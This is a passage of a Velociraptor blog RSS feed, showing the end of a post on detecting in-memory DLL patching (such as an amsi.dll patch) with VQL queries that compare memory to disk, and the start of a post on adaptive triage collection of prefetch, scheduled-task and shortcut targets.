+enough):&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-vql"&gt;LET Compare(MemoryData, DiskData) = SELECT
+ _value AS Offset,
+ MemoryData[_value:(_value + 8)] AS MemoryInt,
+ DiskData[_value:(_value + 8)] AS DiskInt
+ FROM range(end=len(list=MemoryData), step=8)
+ WHERE MemoryInt != DiskInt
+
+SELECT
+ *, Hex(X=Address) AS Address,
+ Hex(X=Address - TextSegment.VMA) AS ASLR,
+ GetTextSegment(Path=Dll) AS TextSegment,
+ Compare(DiskData=read_file(offset=TextSegment.FileOffset,
+ length=TextSegment.Size,
+ filename=Dll),
+ MemoryData=read_file(offset=Address,
+ length=TextSegment.Size,
+ accessor=&amp;quot;process&amp;quot;,
+ filename=PidAsString(Pid=Pid))) AS Comparison
+FROM Sections
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I first define a &lt;code&gt;Compare&lt;/code&gt; VQL function which accepts two buffers
+&lt;code&gt;MemoryData&lt;/code&gt; and &lt;code&gt;DiskData&lt;/code&gt;. It then iterates over the length of the
+buffers in steps of 8 bytes. For each 8 byte offset, the function gets
+the bytes in both buffers and compares them. The function then shows
+the rows where the memory is different.&lt;/p&gt;
+&lt;p&gt;
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+ &lt;div class="figure"&gt;
+ &lt;img src="https://docs.velociraptor.app/blog/2025/2025-11-15-memory-analysis-pt1//blog/2025/2025-11-15-memory-analysis-pt1/comparing_process_memory.png"
+ class="inline"
+ alt="Comparing process memory with disk"
+ width="1581" height="270"&gt;
+ &lt;/div&gt;
+ &lt;figcaption&gt;
+ &lt;a class="image-link"
+ target="_blank" rel="noopener noreferrer"
+ href="comparing_process_memory.png"&gt;
+ &lt;i class="fa fa-download"&gt;&lt;/i&gt;&lt;/a&gt;
+ Comparing process memory with disk
+ &lt;/figcaption&gt;
+&lt;/figure&gt;
+
+
+
+
+&lt;/p&gt;
+&lt;p&gt;We can see that in this case, a single 8 byte address is different
+between the memory and disk at offset 46080.&lt;/p&gt;
+&lt;h2 id="step-7-resolving-the-function-that-was-patched"&gt;Step 7: Resolving the function that was patched&lt;/h2&gt;
+&lt;p&gt;While it is interesting to see the address of where the memory has
+been modified, we don&amp;rsquo;t know much about this address. It would be nice
+to be able to see what function exactly was patched since it will give
+us more indication of the intent of the patch.&lt;/p&gt;
+&lt;p&gt;Since &lt;code&gt;amsi.dll&lt;/code&gt; exports a number of functions, we know their relative
+addresses. We can therefore look up which exported function starts
+just before the modified address - chances are this is the function
+the attacker wanted to modify.&lt;/p&gt;
+&lt;p&gt;The DLL&amp;rsquo;s export table indicates all the functions that are exported
+from the dll, and their Relative Virtual Addresses (i.e. relative
+address to the base address at which the DLL is loaded).&lt;/p&gt;
+&lt;p&gt;Therefore we need to calculate the relative address of the hit, and
+then look up the export table quickly to resolve the nearest function.&lt;/p&gt;
+&lt;p&gt;
+
+
+
+
+
+
+
+ 
+ 
+ 
+ 
+ 
+ 
+&lt;figure&gt;
+ &lt;div class="figure"&gt;
+ &lt;img src="https://docs.velociraptor.app/blog/2025/2025-11-15-memory-analysis-pt1//blog/2025/2025-11-15-memory-analysis-pt1/calculating_hit_rva_.svg" alt="Calculating the Relative Virtual Address of the memory
+hit"
+ class="inline"
+ height="1103.3333333333335"
+ width="1596.6666666666665" /&gt;
+ &lt;/div&gt;
+ &lt;figcaption&gt;
+ &lt;a class="image-link"
+ target="_blank" rel="noopener noreferrer"
+ href="calculating_hit_rva.svg"&gt;&lt;i class="fa fa-download"&gt;&lt;/i&gt;&lt;/a&gt;
+ Calculating the Relative Virtual Address of the memory
+hit
+ &lt;/figcaption&gt;
+&lt;/figure&gt;
+
+
+
+
+&lt;/p&gt;
+&lt;p&gt;This is shown diagrammatically above. The different offset (within the
+mapped segment) is converted to an RVA by adding the &lt;code&gt;.text&lt;/code&gt; section&amp;rsquo;s
+RVA offset, then we can look up the name of the function from the
+export table using the &lt;a href="https://docs.velociraptor.app/vql_reference/other/describe_address/" &gt;describe_address()&lt;/a&gt;
+ function.&lt;/p&gt;
+&lt;p&gt;We modify our comparison function to accept the &lt;code&gt;TextSegment&lt;/code&gt; and
+return the name of the exported function:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-vql"&gt;LET Compare(MemoryData, DiskData, TextSegment, Dll) = SELECT
+ _value AS Offset,
+ TextSegment.RVA + _value AS RVA,
+ describe_address(module=Dll, rva=TextSegment.RVA + _value).func AS Func,
+ MemoryData[_value:(_value + 8)] AS MemoryInt,
+ DiskData[_value:(_value + 8)] AS DiskInt
+ FROM range(end=len(list=MemoryData), step=8)
+ WHERE MemoryInt != DiskInt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+ &lt;div class="figure"&gt;
+ &lt;img src="https://docs.velociraptor.app/blog/2025/2025-11-15-memory-analysis-pt1//blog/2025/2025-11-15-memory-analysis-pt1/resolving_addresses.png"
+ class="inline"
+ alt="Resolving the patched memory back to a function name"
+ width="1581" height="273"&gt;
+ &lt;/div&gt;
+ &lt;figcaption&gt;
+ &lt;a class="image-link"
+ target="_blank" rel="noopener noreferrer"
+ href="resolving_addresses.png"&gt;
+ &lt;i class="fa fa-download"&gt;&lt;/i&gt;&lt;/a&gt;
+ Resolving the patched memory back to a function name
+ &lt;/figcaption&gt;
+&lt;/figure&gt;
+
+
+
+
+&lt;/p&gt;
+&lt;p&gt;Now it is very obvious what this patch aims to achieve!&lt;/p&gt;
+&lt;h2 id="step-8-handling-relocations"&gt;Step 8: Handling relocations&lt;/h2&gt;
+&lt;p&gt;The above example was very simplified. If we tested this over more
+binaries we would discover that there are many memory locations which
+are different from disk due to PE relocations. These are special
+addresses in the binary code which require &amp;ldquo;fixing up&amp;rdquo; when the binary
+is moved from its preferred base address.&lt;/p&gt;
+&lt;p&gt;With the use of 64 bit code, the number of relocations is much
+smaller, although 64 bit code can sometimes have relocations
+too. However, in 32 bit code relocations are very common.&lt;/p&gt;
+&lt;p&gt;When an address is patched by the loaded due to relocations, the value
+in that address is increased by the ASLR offset. This means the
+integers stored at that address on disk and memory have a constant
+difference.&lt;/p&gt;
+&lt;p&gt;More complex VQL can deal with these and exclude expected differences
+due to relocations.&lt;/p&gt;
+&lt;p&gt;We will not describe this more complex code in this blog post, and
+simply refer the reader to the full &lt;a href="https://docs.velociraptor.app/exchange/artifacts/pages/windows.memory.mem2disk/" &gt;Windows.Memory.Mem2Disk&lt;/a&gt;
+ artifact,
+written by Lautaro Lecumberry and Dr. Michael Denzel.&lt;/p&gt;
+&lt;p&gt;This artifact is also optimized for performance and has many useful
+filters to restrict scanning to those dlls commonly targeted by
+malware. The artifact is also multi-threaded which makes scanning
+multiple processes in parallel possible.&lt;/p&gt;
+&lt;p&gt;
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+ &lt;div class="figure"&gt;
+ &lt;img src="https://docs.velociraptor.app/blog/2025/2025-11-15-memory-analysis-pt1//blog/2025/2025-11-15-memory-analysis-pt1/Windows.Memory.Mem2Disk.png"
+ class="inline"
+ alt="Output from the Windows.Memory.Mem2Disk artifact"
+ width="1541" height="582"&gt;
+ &lt;/div&gt;
+ &lt;figcaption&gt;
+ &lt;a class="image-link"
+ target="_blank" rel="noopener noreferrer"
+ href="Windows.Memory.Mem2Disk.png"&gt;
+ &lt;i class="fa fa-download"&gt;&lt;/i&gt;&lt;/a&gt;
+ Output from the Windows.Memory.Mem2Disk artifact
+ &lt;/figcaption&gt;
+&lt;/figure&gt;
+
+
+
+
+&lt;/p&gt;
+&lt;p&gt;The artifact also allows uploading the different memory regions for
+further inspection.&lt;/p&gt;
+&lt;p&gt;On my system the &lt;code&gt;Windows.Memory.Mem2Disk&lt;/code&gt; artifact completes a full
+scan of all running processes in under 2 seconds.&lt;/p&gt;
+&lt;h1 id="discussion"&gt;Discussion&lt;/h1&gt;
+&lt;p&gt;In this post we saw how some of the memory analysis tools available in
+Velociraptor can be combined to write some very sophisticated
+detections for memory patching attacks.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s compare those memory analysis primitives we explored in this
+article, with Volatility&amp;rsquo;s plugins:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;The &lt;code&gt;pslist&lt;/code&gt; plugin is similar - Velociraptor&amp;rsquo;s plugin returns
+similar results to Volatility&amp;rsquo;s &lt;code&gt;pslist&lt;/code&gt; plugin, except that
+Velociraptor&amp;rsquo;s plugin uses the APIs, making it much faster and
+absolutely reliable. Volatility&amp;rsquo;s &lt;code&gt;pslist&lt;/code&gt; plugin parses internal
+kernel structures, depends on memory profiles which can be fragile
+and is susceptible to memory smear (e.g. process linked list may be
+broken due to smear causing many processes to be missed).&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Velociraptor&amp;rsquo;s &lt;code&gt;vad()&lt;/code&gt; plugin is very similar to Volatility&amp;rsquo;s &lt;code&gt;vad&lt;/code&gt;
+plugin, but uses the APIs to obtain its data, hence the results are
+coherent and reliable.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;When converting from kernel paths to filesystem paths, we used
+Velociraptor&amp;rsquo;s &lt;code&gt;winobj&lt;/code&gt; plugin which is similar to Volatility&amp;rsquo;s
+&lt;code&gt;winobj&lt;/code&gt; plugin.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Parsing the Dll from disk we used Velociraptor&amp;rsquo;s powerful
+&lt;code&gt;parse_pe()&lt;/code&gt; plugin which gives a lot of details about the PE file,
+including sections, exports etc.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;When reading process memory, we used &lt;code&gt;read_file()&lt;/code&gt; with the process
+accessor. Volatility has similar internal facilities to reconstruct
+the process virtual address space from the physical memory
+image. However, this capability is limited because much of the PE
+mapped section is not memory resident into physical memory. Windows
+maps the DLL lazily such that data is read from disk only when
+needed. This typically means that dumping process memory from
+Volatility is unreliable as it is missing large chunks of the
+binary.&lt;/p&gt;
+&lt;p&gt;To be fair, if the binary is patched in memory, then the page will
+be allocated (using copy-on-write semantics) and it is likely to be
+resident. So Volatility is likely to still find all the patched
+pages in physical memory.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Resolving function names we used the &lt;code&gt;describe_address()&lt;/code&gt; plugin,
+which caches much of the data, so it is very fast to resolve many
+addresses.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Velociraptor&amp;rsquo;s memory analysis does not require a memory image, and
+yields better results. It is typically much faster and can be deployed
+at scale over a large number of endpoints. Since the logic is written
+in VQL, we can tweak and improve the query over time without needing
+to deploy new binaries or endpoints.&lt;/p&gt;
+&lt;p&gt;Velociraptor&amp;rsquo;s VQL language is fast and multithreaded, allowing very
+fast scanning. If needed, Velociraptor&amp;rsquo;s queries can be CPU limited
+too so we can balance speed over endpoint resource usage.&lt;/p&gt;
+&lt;p&gt;So is it always better to use Velociraptor&amp;rsquo;s memory analysis? Not
+always. The main disadvantage with Velociraptor&amp;rsquo;s approach is that
+data is obtained from standard API calls. This means that the
+operating system can enforce security restrictions on the data
+Velociraptor can access.&lt;/p&gt;
+&lt;p&gt;It is quite normal for Velociraptor to be unable to read some process
+memory - either due to a security product preventing this operation,
+or because the target process is protected by the operating system
+(e.g. &lt;a href="https://learn.microsoft.com/en-us/windows/win32/services/protecting-anti-malware-services-" target="_blank" &gt;Protected Process Light
+(PPL)&lt;/a&gt;
+). In
+this case we will see messages such as &lt;code&gt;vad: OpenProcess for pid 1004 (csrss.exe) : Access is denied.&lt;/code&gt; limiting our access to some processes.&lt;/p&gt;
+&lt;p&gt;Does it matter? It depends. If the malware has a higher level of access
+than Velociraptor (e.g. if it is running in kernel mode, or is signed
+as a PPL process) then it might be able to hide in those protected
+processes that Velociraptor cannot access.&lt;/p&gt;
+&lt;p&gt;But then again, if the malware has such privilege it can easily stop a
+driver from loading to prevent physical memory acquisition as well -
+it becomes an arms race.&lt;/p&gt;
+&lt;h1 id="conclusions"&gt;Conclusions&lt;/h1&gt;
+&lt;p&gt;When analysts think of developing a new memory analysis technique,
+they often immediately go to a physical memory image with a framework
+like Volatility. I hope you have seen that this is not necessary and that
+Velociraptor&amp;rsquo;s VQL actually makes things much easier to develop and
+can produce more reliable results.&lt;/p&gt;
+&lt;p&gt;Velociraptor&amp;rsquo;s binary parser is also very powerful (it was inspired
+from Volatility&amp;rsquo;s internal parser) so you have similar tools for
+parsing complex binary structures as those that Volatility provides.&lt;/p&gt;
+&lt;p&gt;If you like to try the new &lt;code&gt;Windows.Memory.Mem2Disk&lt;/code&gt; artifact, take
+Velociraptor for a spin ! It is available on GitHub under an open
+source license. As always please file issues on the bug tracker or ask
+questions on our mailing list &lt;code&gt;velociraptor-discuss@googlegroups.com&lt;/code&gt;
+. You can also chat with us directly on discord
+&lt;a href="https://www.velocidex.com/discord" target="_blank" &gt;https://www.velocidex.com/discord&lt;/a&gt;
+ .&lt;/p&gt;</description></item><item><title>Adaptive Collections with Velociraptor</title><link>https://docs.velociraptor.app/blog/2025/2025-09-28-adaptive-collections/</link><pubDate>Sat, 30 Aug 2025 00:00:00 +0000</pubDate><guid>https://docs.velociraptor.app/blog/2025/2025-09-28-adaptive-collections/</guid><description>&lt;p&gt;I recently joined the great folk at &lt;a href="https://www.cybertriage.com/" target="_blank" &gt;Cyber
+Triage&lt;/a&gt;
+ on a webinar to explore the new
+&lt;a href="https://docs.velociraptor.app/exchange/artifacts/pages/cybertriagecollector/" &gt;CyberTriage Velociraptor artifact&lt;/a&gt;
+. I was excited
+to be talking with them since I heard great things about Cyber Triage
+and really wanted to learn more about it.&lt;/p&gt;
+&lt;p&gt;One of the interesting features they presented was the concept of
+&lt;a href="https://www.cybertriage.com/cyber-triage-dfir-collector/" target="_blank" &gt;Adaptive
+Collection&lt;/a&gt;
+
+which I thought was quite neat.&lt;/p&gt;
+&lt;p&gt;In this blog post I will describe what &amp;ldquo;Adaptive Collection&amp;rdquo; means and
+how this really improves the state of the art in DFIR triage. I will
+also show how this is now implemented in Velociraptor and how you can
+use it today to improve your triage and investigation.&lt;/p&gt;
+&lt;h2 id="what-is-triage-collection-anyway"&gt;What is Triage collection anyway?&lt;/h2&gt;
+&lt;p&gt;DFIR is all about trying to quickly determine what happened. In the distant past
+we used to acquire full disk images of systems so we could perform digital
+forensics on them. However, these days this is usually highly impractical:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Hard disks have become so large that imaging them, copying the images
+elsewhere, storing and working with them is often impractical, especially
+since speed is a critical aspect of every investigation.&lt;/li&gt;
+&lt;li&gt;In modern network intrusions we usually need to examine a large number of
+endpoints. Aside from storage constraints, the time required to make full disk
+images of potentially thousands of machines puts this option in the realm of
+the impossible.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Today&amp;rsquo;s best practice is to actively hunt the network with a tool like
+Velociraptor to quickly gather specific, well-targeted artifacts
+across a large number of endpoints.&lt;/p&gt;
+&lt;p&gt;Through efficient distributed hunts the number of systems of interest is
+reduced. We may then perform &lt;em&gt;Triage Acquisition&lt;/em&gt; for the purpose of
+&lt;a href="https://docs.velociraptor.app/training/playbooks/preservation/" &gt;preservation of evidence&lt;/a&gt;
+.
+We often need to delegate the Triage Acquisition step to others who have
+access to the affected systems (for example Help Desk employees or system
+administrators).&lt;/p&gt;
+&lt;p&gt;Triage Acquisition has a number of goals:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;To acquire as much relevant information as possible to be able to determine
+what happened on the system. In many cases we only get one chance
+to perform triage acquisition, before the system is rebuilt and evidence is
+destroyed.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;To perform this collection as quickly as possible. Some critical servers can
+not tolerate prolonged outages or resource-intensive investigative activity.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Triage collection should be as automated as possible. Ideally the person
+initiating the collection should not need to provide any input to the
+collection process. They may not be skilled in DFIR techniques nor be
+accustomed to making critical decisions under pressure.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;These goals call for a high level of automation.&lt;/p&gt;
+&lt;p&gt;Velociraptor&amp;rsquo;s
+&lt;a href="https://docs.velociraptor.app/docs/deployment/offline_collections/" &gt;offline collector&lt;/a&gt;
+
+is specifically designed to be fully automated - the operator simply needs to
+run it and a triage collection is made. The collection can be uploaded to the
+cloud or returned to the investigation team some other (potentially out-of-band)
+way.&lt;/p&gt;
+&lt;p&gt;
+
+
+
+
+
+
+
+ 
+ 
+ 
+ 
+ 
+ 
+&lt;figure&gt;
+ &lt;div class="figure"&gt;
+ &lt;img src="https://docs.velociraptor.app/blog/2025/2025-09-28-adaptive-collections//blog/2025/2025-09-28-adaptive-collections/offline_process_.svg" alt="The offline triage process"
+ class="inline"
+ height="371.35759383814633"
+ width="821.52153753842" /&gt;
+ &lt;/div&gt;
+ &lt;figcaption&gt;
+ &lt;a class="image-link"
+ target="_blank" rel="noopener noreferrer"
+ href="offline_process.svg"&gt;&lt;i class="fa fa-download"&gt;&lt;/i&gt;&lt;/a&gt;
+ The offline triage process
+ &lt;/figcaption&gt;
+&lt;/figure&gt;
+
+
+
+
+&lt;/p&gt;
+&lt;p&gt;The main takeaway from this diagram is that it is difficult to iterate
+over the collection with the offline process. Initiating a new
+collection required repeating the entire process again with potential
+manual intervention.&lt;/p&gt;
+&lt;p&gt;Therefore it is desirable to collect as much as possible in the first
+place to minimize the need to go back and re-collect more data.&lt;/p&gt;
+&lt;p&gt;While it would be nice to collect as much as possible, we need to be
+speedy in our collection. Therefore we need to make some tradeoffs:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;The more files we collect the longer it takes and the larger the
+collection gets. This makes it harder to handle more systems and
+transfer more data across the network.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;However, once the collection is done it is not always possible to go
+back and get more files. Sometimes systems are rebuilt the preservation step,
+which puts pressure on responders to collect all relevant data in a single
+acquisition step. This pressure can also lead to over-collection of data,
+including irrelevant items.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="current-state-of-the-art"&gt;Current state of the art&lt;/h2&gt;
+&lt;p&gt;One of the more popular artifacts to use with the offline collector is
+the &lt;code&gt;Windows.KapeFiles.Targets&lt;/code&gt; artifact. This artifact uses target
+definitions from the
+&lt;a href="https://github.com/EricZimmerman/KapeFiles" target="_blank" &gt;KapeFiles&lt;/a&gt;
+ project to
+collect files from the system. The project defines targets which are
+essentially search globs finding particular files on the system.&lt;/p&gt;
+&lt;p&gt;For example, the Windows Event logs are usually stored in
+&lt;code&gt;C:\Windows\System32\winevt\logs\*.evtx&lt;/code&gt;. During a preservation triage
+acquisition, one would usually collect all those files.&lt;/p&gt;
+&lt;p&gt;Meta-Targets can also be defined so that when the user chooses to
+collect the
+&lt;a href="https://triage.velocidex.com/docs/windows.triage.targets/rules/#!BasicCollection" target="_blank" &gt;BasicCollection&lt;/a&gt;
+
+target, Velociraptor will automatically collect the Event logs,
+Registry, MFT etc.&lt;/p&gt;
+&lt;p&gt;There are many &lt;code&gt;KapeFiles&lt;/code&gt; targets collecting files related to many
+products and applications, however they are all essentially static
+globs. The &lt;code&gt;Windows.KapeFiles.Targets&lt;/code&gt; artifact looks for files on disk
+from this static list of pre-determined globs.&lt;/p&gt;
+
+&lt;div class="mynotices note"&gt;
+ &lt;div heading=" The new Windows.Triage.Targets artifact "&gt;&lt;p&gt;Since the Velociraptor 0.75 release, the &lt;code&gt;Windows.KapeFiles.Targets&lt;/code&gt;
+artifact is no longer built into Velociraptor. Instead it is managed
+in its
+&lt;a href="https://triage.velocidex.com/docs/windows.triage.targets/rules/" target="_blank" &gt;own project&lt;/a&gt;
+.&lt;/p&gt;
+&lt;p&gt;The new artifact goes beyond the using simple globs expressions, and
+has therefore been renamed to &lt;code&gt;Windows.Triage.Targets&lt;/code&gt; to distinguish it from
+it&amp;rsquo;s predecessor artifact.&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+
+&lt;h3 id="why-is-this-not-enough"&gt;Why is this not enough?&lt;/h3&gt;
+&lt;p&gt;While this is artifact is a great start, it is usually not enough.
+Many of the forensic artifacts collected may point to other files that
+may be found on disk, and those files are not usually collected.&lt;/p&gt;
+&lt;p&gt;For example, consider the &lt;a href="https://docs.velociraptor.app/artifact_references/pages/windows.forensics.prefetch/" &gt;prefetch artifact&lt;/a&gt;
+ in which
+Windows stores paths to previously run executables. While the location
+of the prefetch files themselves is well known
+(i.e. &lt;code&gt;C:\Windows\Prefetch\*.pf&lt;/code&gt;), when an analyst examines these
+files, they may discover that they point at a suspicious executable
+located somewhere else on the disk from which file were not acquired.&lt;/p&gt;
+&lt;p&gt;During the initial triage acquisition phase there is no way to know if the
+executables they point to are malicious or not. With the standard &lt;code&gt;KapeFiles&lt;/code&gt;
+collections, the investigator needs to go back to the original system to get
+those files.&lt;/p&gt;
+&lt;p&gt;Another example is the XML files that define Windows Scheduled tasks, which are
+normally located in &lt;code&gt;C:\Windows\System32\Tasks\**&lt;/code&gt;. These files point to
+periodically launched executables that could be located anywhere on the disk.&lt;/p&gt;
+&lt;h3 id="what-is-adaptive-collection"&gt;What is Adaptive Collection?&lt;/h3&gt;
+&lt;p&gt;The idea of &amp;ldquo;adaptive collection&amp;rdquo; is that the collector itself performs an
+initial parsing and analysis phase and then decides based on it&amp;rsquo;s results which
+additional files to collect. That is, relevant files should be collected
+automatically even when not explicitly specified as collection targets.&lt;/p&gt;
+&lt;p&gt;Applying an adaptive collection strategy to the previous example, the user would
+specify collection of the prefetch files, but the collector would parse each
+prefetch file automatically and check whether the target file exists in the
+target location. For each target, if it is present, the collector will also
+collect it.&lt;/p&gt;
+&lt;p&gt;This way, when the analyst later examines the prefetch files, they can
+immediately also inspect the related binary, without needing to
+go back to the original system.&lt;/p&gt;
+&lt;p&gt;Of course in the case of prefetch, it is possible that the target executable was
+deleted before the acquisition. In this case the adaptive collector cannot
+acquire it. But this is also an important piece of information as the analyst
+then knows that the executable is actually missing and that there is no point in
+trying to fetch it in a subsequent collection phase.&lt;/p&gt;
+&lt;p&gt;The point of adaptive collection is to include files which may be relevant once
+the basic (primary) artifacts are parsed. This avoids needing to go back and
+re-collect additional files after the analysis is performed.&lt;/p&gt;
+&lt;p&gt;A useful side-effect of this approach is that forensic artifacts are already
+parsed and analyzed, so there is no need for further post-processing of bulk
+collected files. This simplifies the post-processing pipeline and speeds up
+analysis when dealing with a large number of systems.&lt;/p&gt;
+&lt;h2 id="the-windowstriagetargets-artifact"&gt;The Windows.Triage.Targets artifact&lt;/h2&gt;
+&lt;p&gt;The &lt;code&gt;Windows.Triage.Targets&lt;/code&gt; artifact is compiled from many separate
+rules. Each rule specifies one or more targets - basically a single
+type of forensic artifact to acquire.&lt;/p&gt;
+&lt;p&gt;You can download the &lt;code&gt;Windows.Triage.Targets&lt;/code&gt; artifact from
+&lt;a href="https://triage.velocidex.com/docs/windows.triage.targets/" target="_blank" &gt;https://triage.velocidex.com/docs/windows.triage.targets/&lt;/a&gt;
+ or simply
+use the built in &lt;a href="https://docs.velociraptor.app/artifact_references/pages/server.import.extras/" &gt;Server.Import.Extras&lt;/a&gt;
+ artifact to
+automatically download and import the latest version.&lt;/p&gt;
+&lt;p&gt;The artifact contains many adaptive rules, for example some of these
+are:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;AdaptiveScheduledTasks&lt;/code&gt;: Enumerates all scheduled tasks and
+attempts to acquire the associated binaries run by them.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;LnkTargets&lt;/code&gt;: Searches for &lt;code&gt;lnk&lt;/code&gt; files and attempts to acquire their file
+targets. &lt;code&gt;lnk&lt;/code&gt; files are common infection vectors.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;PrefetchBinaries&lt;/code&gt;: enumerates all prefetch files and captures the associated
+executables.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;PsList&lt;/code&gt;: enumerates all running processes and captures their respective
+binaries.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Services&lt;/code&gt;: enumerates all installed services and captures their binaries.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;All of the adaptive rules are triggered by the meta-target
+&lt;a href="https://triage.velocidex.com/docs/windows.triage.targets/rules/#_Live" target="_blank" &gt;_Live&lt;/a&gt;
+.
+So all a user needs to do is to select the &lt;code&gt;_Live&lt;/code&gt; target and collect the
+artifact (Usually the &lt;code&gt;_Live&lt;/code&gt; target is selected &lt;em&gt;in addition&lt;/em&gt; to more
+traditional/non-adaptive target sets like &lt;code&gt;_SansTriage&lt;/code&gt; or &lt;code&gt;_BasicCollection&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;
+
+
+
+
+
+
+
+ 
+ 
+ 
+ 
+ 
+ 
+&lt;figure&gt;
+ &lt;div class="figure"&gt;
+ &lt;img src="https://docs.velociraptor.app/blog/2025/2025-09-28-adaptive-collections//blog/2025/2025-09-28-adaptive-collections/launching_triage_.svg" alt="Launching the triage collection"
+ class="inline"
+ height="676.3558210073326"
+ width="975.9157257252883" /&gt;
+ &lt;/div&gt;
+ &lt;figcaption&gt;
+ &lt;a class="image-link"
+ target="_blank" rel="noopener noreferrer"
+ href="launching_triage.svg"&gt;&lt;i class="fa fa-download"&gt;&lt;/i&gt;&lt;/a&gt;
+ Launching the triage collection
+ &lt;/figcaption&gt;
+&lt;/figure&gt;
+
+
+
+
+&lt;/p&gt;
+&lt;p&gt;Adaptive rules may substantially increase the number of files
+collected. However, we rarely care about legitimate binaries which are
+often signed. The way we choose if a file is to be collected is termed
+the &lt;code&gt;Collection Policy&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;There are a few choices:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;ExcludeSigned&lt;/code&gt;: This is the default policy. We collect all
+adaptive targets, except if they are a trusted signed binary. Most
+of the time, signed binaries are trusted already and there is no
+benefit in collecting them. In practice this reduces the collection
+size substantially.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;HashOnly&lt;/code&gt; is used to simply take the hash of the file but not to
+collect the file itself. This setting is useful when the client is
+connected and available so interesting files may be fetched at a
+later stage. The hashes and file stats are enough to indicate whether
+the target files are still present on the system or not.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;AllFiles&lt;/code&gt; Just collect all files. This is not recommended for
+adaptive collections as it will also collect system files and
+signed/trusted binaries.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class="mynotices note"&gt;
+ &lt;div heading=" Collection optimizations "&gt;&lt;p&gt;Adaptive rules will sometimes attempt to collect the same file. For
+example, if there are several &lt;code&gt;notepad&lt;/code&gt; processes running, the &lt;code&gt;PsList&lt;/code&gt;
+rule will attempt to collect &lt;code&gt;notepad.exe&lt;/code&gt; multiple times.&lt;/p&gt;
+&lt;p&gt;The triage artifact automatically caches and deduplicates these
+collections so that collecting the same file multiple times is safe
+and fast - only one copy will be acquired and it will be hashed only
+once.&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+
+&lt;p&gt;Let&amp;rsquo;s look at the result of collecting the &lt;code&gt;PrefetchBinaries&lt;/code&gt; target:&lt;/p&gt;
+&lt;p&gt;
+
+
+
+
+
+
+
+ 
+ 
+ 
+ 
+ 
+ 
+&lt;figure&gt;
+ &lt;div class="figure"&gt;
+ &lt;img src="https://docs.velociraptor.app/blog/2025/2025-09-28-adaptive-collections//blog/2025/2025-09-28-adaptive-collections/prefetch_target_.svg" alt="Viewing the Prefetch target"
+ class="inline"
+ height="569.5454711914062"
+ width="1202.8781442684979" /&gt;
+ &lt;/div&gt;
+ &lt;figcaption&gt;
+ &lt;a class="image-link"
+ target="_blank" rel="noopener noreferrer"
+ href="prefetch_target.svg"&gt;&lt;i class="fa fa-download"&gt;&lt;/i&gt;&lt;/a&gt;
+ Viewing the Prefetch target
+ &lt;/figcaption&gt;
+&lt;/figure&gt;
+
+
+
+
+&lt;/p&gt;
+&lt;p&gt;Collecting the &lt;code&gt;PrefetchBinaries&lt;/code&gt; target will execute the standard
+Velociraptor &lt;code&gt;Windows.Forensics.Prefetch&lt;/code&gt; artifact and capture all the usual
+fields that the artifact returns, such as run times and other prefetch
+related fields. Additionally, Velociraptor will attempt to acquire
+each target if possible (if the file still exists on disk at that
+location).&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;Windows.Triage.Targets&lt;/code&gt; artifact automatically captures metadata
+such as last modified timestamps, hashes and authenticode status for
+executables.&lt;/p&gt;
+&lt;p&gt;In addition to collecting the prefetch binary targets, we also receive
+all the usual output from collecting the &lt;code&gt;Windows.Forensics.Prefetch&lt;/code&gt;
+artifact, saving us from having to re-collecting it later.&lt;/p&gt;
+&lt;p&gt;Another example is collecting the
+&lt;a href="https://triage.velocidex.com/docs/windows.triage.targets/rules/#LnkTargets" target="_blank" &gt;LnkTargets&lt;/a&gt;
+
+rule. This rule analyzes &lt;code&gt;Lnk&lt;/code&gt; files (shortcuts) to extract their targets.&lt;/p&gt;
+&lt;p&gt;
+
+
+
+
+
+
+
+ 
+ 
+ 
+ 
+ 
+ 
+&lt;figure&gt;
+ &lt;div class="figure"&gt;
